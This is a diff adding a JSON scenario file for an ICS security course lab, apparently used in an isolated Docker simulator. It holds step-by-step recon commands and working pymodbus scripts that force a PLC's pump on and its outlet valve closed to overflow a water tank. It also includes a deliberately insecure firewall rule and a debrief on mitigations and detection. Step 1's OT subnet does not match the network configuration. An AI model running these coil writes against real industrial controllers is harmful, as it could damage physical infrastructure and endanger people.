@@ -1,0 +1,382 @@
+{
+  "meta": {
+    "formatVersion": "1.0",
+    "name": "Tutorial 01 — Modbus Coil Write Attack",
+    "description": "A guided beginner scenario that walks students through a complete ICS attack chain: OSINT reconnaissance against a fictitious industrial company website, DNS enumeration, network scanning, and a Modbus TCP coil write that forces a pump on and closes an outlet valve — causing a water tank overflow. Developed for use in ICS/SCADA cybersecurity courses at UTSA.",
+    "sector": "water-treatment",
+    "author": "Ian Burres — UTSA",
+    "createdAt": "2026-05-19T00:00:00.000Z",
+    "updatedAt": "2026-05-19T00:00:00.000Z",
+    "appVersion": "0.13.0",
+    "locked": false,
+    "brief": "## Mission: Water Tank Overflow\n\nMeridian Process Controls operates a water treatment facility. A network misconfiguration exposes the OT process network to the Internet DMZ. Your mission is to:\n\n1. Conduct OSINT against the company website to discover the OT subnet and credentials hidden in the HTML source.\n2. Enumerate DNS records to map the attack surface.\n3. Scan the OT network to identify the Modbus-enabled process controller.\n4. Write Modbus coil registers to start the inlet pump and close the outlet valve — triggering a tank overflow condition.\n\n**Rules of Engagement:** This is an isolated Docker lab environment. All traffic stays within your local machine.",
+    "requirements": {
+      "estimatedRamMb": 3072,
+      "estimatedCpuCores": 3,
+      "containerCount": 12
+    },
+    "tutorialSteps": [
+      {
+        "id": "step-01-osint",
+        "title": "Step 1 — OSINT: Discover the Target",
+        "body": "Start by visiting the Meridian Process Controls company website. In a real engagement, an attacker would begin with open-source intelligence (OSINT) before touching any systems.\n\nFrom the attack machine terminal, use `curl` to fetch the site and examine the **HTML source**. Developers often leave infrastructure comments in source code that reveal internal network addresses and credentials.\n\nNavigate to the Kali Linux desktop using the **Attack Terminal** button in the toolbar, then run the command below.",
+        "command": "curl -s http://{{web-company-1.ip}}/ | grep -i 'TODO\\|OT\\|subnet\\|admin\\|password\\|172\\.' | head -30",
+        "successCheck": "You should see a developer comment in the HTML containing the OT subnet (172.20.10.0/24), admin credentials (admin / Meridian2024!), and Modbus port (502). Note these down — you will need them."
+      },
+      {
+        "id": "step-02-page-source",
+        "title": "Step 2 — Dig Deeper: Remote Access Page",
+        "body": "The home page was informative, but the **Remote Access** page (`/remote.html`) is where developers typically put internal tooling links. Fetch this page and inspect its source carefully.\n\nAlso grab the HTTP banner to identify the web server version — this is useful for CVE lookups in a real engagement.",
+        "command": "curl -sv http://{{web-company-1.ip}}/remote.html 2>&1 | head -60",
+        "successCheck": "The Server header reveals nginx 1.27. The remote.html source contains OT network details, protocol ports, and admin credentials. HTTP banner grabbing is a fundamental recon step."
+      },
+      {
+        "id": "step-03-dns",
+        "title": "Step 3 — DNS Enumeration",
+        "body": "The DNS server at `{{dns-1.ip}}` is authoritative for `meridian-process.com`. Enumerate its records to discover all subdomains — each may be a jump host, VPN gateway, or engineering workstation.\n\nUse `dig` or `nslookup` to query A records for common subdomains: `www`, `remote`, `vpn`, `mail`, `ot`, `scada`.",
+        "command": "for sub in www remote vpn mail ot scada plc hmi; do echo -n \"$sub: \"; dig +short @{{dns-1.ip}} $sub.meridian-process.com; done",
+        "successCheck": "You should see A records for www (10.200.50.10) and remote (10.200.50.10). The vpn subdomain may resolve to a Plant DMZ address. Unresolved names are also informative — they confirm scope boundaries."
+      },
+      {
+        "id": "step-04-nmap",
+        "title": "Step 4 — Network Scan: Discover OT Devices",
+        "body": "Using the OT subnet you discovered in Step 1 (`172.20.10.0/24`), run an **Nmap** scan to identify live hosts and open ports.\n\nIn ICS environments, scanning should be **slow and careful** — aggressive scans can crash PLCs and cause physical incidents. Use the `-T2` (polite) timing template and target only TCP ports common to ICS protocols.\n\n**Key ICS ports to check:** 502 (Modbus), 20000 (DNP3), 4840 (OPC UA), 102 (S7comm / IEC 61850), 2404 (IEC 104).",
+        "command": "nmap -T2 -p 502,20000,4840,102,2404 --open {{plc-1.subnet}}",
+        "successCheck": "At least two hosts should respond: the PLC at {{plc-1.ip}} (port 502 open) and the process unit at {{process-unit-1.ip}} (port 502 open). These are your Modbus targets."
+      },
+      {
+        "id": "step-05-modbus-read",
+        "title": "Step 5 — Read Modbus Registers",
+        "body": "Before writing any registers, **read the current state**. This is essential in real ICS security testing — you need to know baseline values before making changes, so you can restore them afterward.\n\nUse `pymodbus` to read coil registers from the PLC at `{{plc-1.ip}}`. Coil addresses:\n- **Coil 0** — Inlet pump (0=off, 1=on)\n- **Coil 1** — Outlet valve (0=closed, 1=open)\n- **Coil 2** — Emergency shutoff (0=normal, 1=trip)\n\nAlso read holding registers 0–4 to see the current tank level and flow rates.",
+        "command": "python3 -c \"\nfrom pymodbus.client import ModbusTcpClient\nc = ModbusTcpClient('{{plc-1.ip}}', port=502)\nc.connect()\ncoils = c.read_coils(0, 3, slave=1)\nregs = c.read_holding_registers(0, 5, slave=1)\nprint('Coils:', coils.bits[:3])\nprint('Tank level (m):', regs.registers[0]/100.0)\nprint('Inlet flow (L/min):', regs.registers[1])\nprint('Outlet flow (L/min):', regs.registers[2])\nc.close()\n\"",
+        "successCheck": "You should see Coils: [False, True, False] — pump off, valve open, no emergency trip. Tank level around 5.0 m (50% full). Inlet and outlet flows are balanced. This is the normal operating state."
+      },
+      {
+        "id": "step-06-coil-write",
+        "title": "Step 6 — Write Modbus Coils (The Attack)",
+        "body": "Now execute the attack: **start the inlet pump** (Coil 0 → 1) and **close the outlet valve** (Coil 1 → 0). With water flowing in but not out, the tank will overflow.\n\nThis is the same technique used in the **2021 Oldsmar, Florida water treatment attack** — except the attacker in that incident used remote access software rather than direct Modbus. The underlying vulnerability is identical: unauthenticated Modbus TCP.\n\n**No authentication is required.** Modbus TCP has no built-in access control — any device on the network can write any register on any PLC. This is why network segmentation and defense-in-depth are critical.",
+        "command": "python3 -c \"\nfrom pymodbus.client import ModbusTcpClient\nc = ModbusTcpClient('{{plc-1.ip}}', port=502)\nc.connect()\n# Start inlet pump (coil 0 = True)\nc.write_coil(0, True, slave=1)\n# Close outlet valve (coil 1 = False)\nc.write_coil(1, False, slave=1)\nprint('Attack complete: pump ON, outlet valve CLOSED')\nprint('Tank will overflow. Check holding register 0 for rising level.')\nc.close()\n\"",
+        "successCheck": "Command succeeds with no exception — Modbus TCP accepted the write with no authentication challenge. Switch to the Grafana monitor (toolbar → Monitor) and watch the tank level holding register rise continuously."
+      },
+      {
+        "id": "step-07-observe",
+        "title": "Step 7 — Observe the Effect",
+        "body": "The attack is running. Now observe the physical consequence using the **Grafana monitoring dashboard**.\n\nOpen the monitor panel (toolbar → Monitor), then navigate to the **ICS Lab Overview** dashboard. Watch the **Tank Level** gauge rise past the 9.0 m overflow threshold. The **Inlet Flow** register will show positive flow; **Outlet Flow** will be zero.\n\nThis is exactly what a blue-team analyst would see in Suricata and Zeek alerts: unexpected Modbus Function Code 5 (Write Single Coil) writes from an external subnet to a PLC — a clear indicator of compromise.\n\n**To restore normal operations**, write Coil 0 = False (pump off) and Coil 1 = True (valve open) using the same pymodbus pattern.",
+        "command": "python3 -c \"\nfrom pymodbus.client import ModbusTcpClient\nc = ModbusTcpClient('{{plc-1.ip}}', port=502)\nc.connect()\nc.write_coil(0, False, slave=1)\nc.write_coil(1, True, slave=1)\nprint('Restored: pump OFF, outlet valve OPEN')\nc.close()\n\"",
+        "successCheck": "Tank level should stop rising and begin dropping back toward 5.0 m. Grafana shows outlet flow resuming. You have successfully executed — and remediated — a Modbus coil write attack against a water treatment PLC."
+      },
+      {
+        "id": "step-08-debrief",
+        "title": "Step 8 — Debrief: What Did We Learn?",
+        "body": "**Vulnerabilities exploited in this scenario:**\n\n- **OSINT exposure** — Developer comments in HTML source leaked OT subnet, credentials, and protocol details. Mitigation: code review, secrets scanning in CI/CD pipelines.\n\n- **Unauthenticated Modbus TCP** — No access control on PLC registers. Mitigation: IEC 62443 zone/conduit model, firewall rules blocking Modbus from untrusted zones.\n\n- **Missing network segmentation** — The attack machine reached the OT subnet directly from the Internet DMZ. Mitigation: plant-DMZ firewall with default-deny OT policy.\n\n**Detection opportunities (Suricata/Zeek):**\n\n- Modbus FC5 (Write Single Coil) from an IP outside the known engineering workstation range\n- DNS queries from the attacker subnet to the authoritative DNS server\n- HTTP access to the company site from the attacker subnet\n\n**Try this next:** Open the FirewallPanel in the Properties panel (select the firewall device) and add a rule to block Modbus TCP (port 502) from `attacker-net` to `ot-net`. Restart the simulation and verify the attack fails.",
+        "successCheck": "You can now explain the full attack chain, the Purdue Reference Model violations it exploited, and at least three detection/prevention controls. Well done."
+      }
+    ]
+  },
+  "visual": {
+    "nodes": [
+      {
+        "id": "plc-1",
+        "type": "plc",
+        "position": { "x": 160, "y": 180 },
+        "data": { "label": "OpenPLC Controller", "zone": "ot" }
+      },
+      {
+        "id": "process-unit-1",
+        "type": "process-unit",
+        "position": { "x": 400, "y": 180 },
+        "data": { "label": "Water Tank", "zone": "ot" }
+      },
+      {
+        "id": "switch-ot",
+        "type": "switch",
+        "position": { "x": 280, "y": 340 },
+        "data": { "label": "OT Switch", "zone": "ot" }
+      },
+      {
+        "id": "hmi-1",
+        "type": "hmi",
+        "position": { "x": 160, "y": 180 },
+        "data": { "label": "FUXA HMI", "zone": "control" }
+      },
+      {
+        "id": "historian-1",
+        "type": "historian",
+        "position": { "x": 400, "y": 180 },
+        "data": { "label": "Process Historian", "zone": "control" }
+      },
+      {
+        "id": "firewall-1",
+        "type": "firewall",
+        "position": { "x": 280, "y": 180 },
+        "data": { "label": "Plant Firewall", "zone": "plant-dmz" }
+      },
+      {
+        "id": "router-dmz",
+        "type": "router",
+        "position": { "x": 280, "y": 340 },
+        "data": { "label": "DMZ Router", "zone": "plant-dmz" }
+      },
+      {
+        "id": "web-company-1",
+        "type": "internet-server",
+        "position": { "x": 160, "y": 200 },
+        "data": { "label": "Meridian Website", "zone": "internet-dmz" }
+      },
+      {
+        "id": "dns-1",
+        "type": "dns-server",
+        "position": { "x": 400, "y": 200 },
+        "data": { "label": "DNS Server", "zone": "internet-dmz" }
+      },
+      {
+        "id": "attack-1",
+        "type": "attack-machine",
+        "position": { "x": 280, "y": 200 },
+        "data": { "label": "Kali Linux", "zone": "attacker" }
+      }
+    ],
+    "edges": [
+      {
+        "id": "e-plc-switch",
+        "source": "plc-1",
+        "target": "switch-ot",
+        "data": { "protocol": "modbus-tcp", "label": "Modbus TCP :502" }
+      },
+      {
+        "id": "e-process-switch",
+        "source": "process-unit-1",
+        "target": "switch-ot",
+        "data": { "protocol": "modbus-tcp", "label": "Modbus TCP :502" }
+      },
+      {
+        "id": "e-switch-firewall",
+        "source": "switch-ot",
+        "target": "firewall-1",
+        "data": { "protocol": "none", "label": "" }
+      },
+      {
+        "id": "e-firewall-router",
+        "source": "firewall-1",
+        "target": "router-dmz",
+        "data": { "protocol": "none", "label": "" }
+      },
+      {
+        "id": "e-web-router",
+        "source": "web-company-1",
+        "target": "router-dmz",
+        "data": { "protocol": "none", "label": "HTTP :80" }
+      },
+      {
+        "id": "e-dns-router",
+        "source": "dns-1",
+        "target": "router-dmz",
+        "data": { "protocol": "none", "label": "DNS :53" }
+      },
+      {
+        "id": "e-attack-router",
+        "source": "attack-1",
+        "target": "router-dmz",
+        "data": { "protocol": "none", "label": "" }
+      }
+    ],
+    "viewport": { "x": 0, "y": 0, "zoom": 1.0 }
+  },
+  "network": {
+    "segments": [
+      {
+        "zone": "ot",
+        "subnet": "10.200.10.0/24",
+        "gateway": "10.200.10.1",
+        "dockerNetwork": "ics-sim-ot-net"
+      },
+      {
+        "zone": "control",
+        "subnet": "10.200.20.0/24",
+        "gateway": "10.200.20.1",
+        "dockerNetwork": "ics-sim-control-net"
+      },
+      {
+        "zone": "plant-dmz",
+        "subnet": "10.200.30.0/24",
+        "gateway": "10.200.30.1",
+        "dockerNetwork": "ics-sim-plant-dmz-net"
+      },
+      {
+        "zone": "enterprise",
+        "subnet": "10.200.40.0/24",
+        "gateway": "10.200.40.1",
+        "dockerNetwork": "ics-sim-enterprise-net"
+      },
+      {
+        "zone": "internet-dmz",
+        "subnet": "10.200.50.0/24",
+        "gateway": "10.200.50.1",
+        "dockerNetwork": "ics-sim-internet-dmz-net"
+      },
+      {
+        "zone": "attacker",
+        "subnet": "10.200.60.0/24",
+        "gateway": "10.200.60.1",
+        "dockerNetwork": "ics-sim-attacker-net"
+      }
+    ],
+    "routes": []
+  },
+  "devices": {
+    "devices": {
+      "plc-1": {
+        "nodeId": "plc-1",
+        "category": "plc",
+        "ipAddress": "10.200.10.10",
+        "protocols": ["modbus-tcp"],
+        "modbus": {
+          "mode": "tcp",
+          "port": 502,
+          "unitId": 1,
+          "registers": {
+            "coils": {
+              "0": 0,
+              "1": 1,
+              "2": 0
+            },
+            "holdingRegisters": {
+              "0": 500,
+              "1": 120,
+              "2": 120
+            }
+          }
+        }
+      },
+      "process-unit-1": {
+        "nodeId": "process-unit-1",
+        "category": "process-unit",
+        "ipAddress": "10.200.10.20",
+        "protocols": ["modbus-tcp"],
+        "processUnit": {
+          "processType": "water-tank",
+          "tankVolumeL": 1000,
+          "tankAreaM2": 1.0,
+          "pumpFlowMaxLpm": 200,
+          "valveFlowMaxLpm": 200,
+          "initialLevelPct": 50
+        }
+      },
+      "switch-ot": {
+        "nodeId": "switch-ot",
+        "category": "switch",
+        "ipAddress": "10.200.10.240",
+        "protocols": ["none"]
+      },
+      "hmi-1": {
+        "nodeId": "hmi-1",
+        "category": "hmi",
+        "ipAddress": "10.200.20.10",
+        "protocols": ["modbus-tcp"]
+      },
+      "historian-1": {
+        "nodeId": "historian-1",
+        "category": "historian",
+        "ipAddress": "10.200.20.11",
+        "protocols": ["none"]
+      },
+      "firewall-1": {
+        "nodeId": "firewall-1",
+        "category": "firewall",
+        "ipAddress": "10.200.30.10",
+        "protocols": ["none"]
+      },
+      "router-dmz": {
+        "nodeId": "router-dmz",
+        "category": "router",
+        "ipAddress": "10.200.30.11",
+        "protocols": ["none"]
+      },
+      "web-company-1": {
+        "nodeId": "web-company-1",
+        "category": "internet-server",
+        "ipAddress": "10.200.50.10",
+        "protocols": ["none"],
+        "dockerImage": "ghcr.io/iburres/ics-sim-web-company:latest"
+      },
+      "dns-1": {
+        "nodeId": "dns-1",
+        "category": "dns-server",
+        "ipAddress": "10.200.50.5",
+        "protocols": ["none"],
+        "dns": {
+          "domain": "meridian-process.com",
+          "webServerIp": "10.200.50.10"
+        }
+      },
+      "attack-1": {
+        "nodeId": "attack-1",
+        "category": "attack-machine",
+        "ipAddress": "10.200.60.10",
+        "protocols": ["none"]
+      }
+    }
+  },
+  "security": {
+    "defaultFirewallPolicy": "deny",
+    "firewallRules": [
+      {
+        "id": "rule-allow-attacker-internet-dmz-http",
+        "sourceZone": "attacker",
+        "destinationZone": "internet-dmz",
+        "protocol": "tcp",
+        "destinationPort": 80,
+        "action": "allow",
+        "comment": "Allow attack machine to reach company website on port 80 (OSINT step)"
+      },
+      {
+        "id": "rule-allow-attacker-internet-dmz-dns",
+        "sourceZone": "attacker",
+        "destinationZone": "internet-dmz",
+        "protocol": "udp",
+        "destinationPort": 53,
+        "action": "allow",
+        "comment": "Allow DNS enumeration from attack machine"
+      },
+      {
+        "id": "rule-allow-attacker-ot-modbus",
+        "sourceZone": "attacker",
+        "destinationZone": "ot",
+        "protocol": "tcp",
+        "destinationPort": 502,
+        "action": "allow",
+        "comment": "INTENTIONALLY INSECURE: Modbus TCP accessible from attacker network — demonstrates missing segmentation. Students add a deny rule here to remediate."
+      },
+      {
+        "id": "rule-allow-control-ot-modbus",
+        "sourceZone": "control",
+        "destinationZone": "ot",
+        "protocol": "tcp",
+        "destinationPort": 502,
+        "action": "allow",
+        "comment": "Allow HMI and historian to read Modbus registers from PLCs"
+      },
+      {
+        "id": "rule-allow-ot-control-any",
+        "sourceZone": "ot",
+        "destinationZone": "control",
+        "protocol": "any",
+        "destinationPort": "any",
+        "action": "allow",
+        "comment": "Allow OT devices to report to control center historian"
+      }
+    ],
+    "ids": {
+      "enabledRulesets": ["emerging-scada", "emerging-modbus"],
+      "disabledRuleIds": [],
+      "zeekScripts": ["modbus.zeek", "dnp3.zeek"]
+    },
+    "logging": {
+      "retentionDays": 7,
+      "influxdbEnabled": true,
+      "lokiEnabled": true
+    }
+  },
+  "registry": [],
+  "packLayers": []
+}
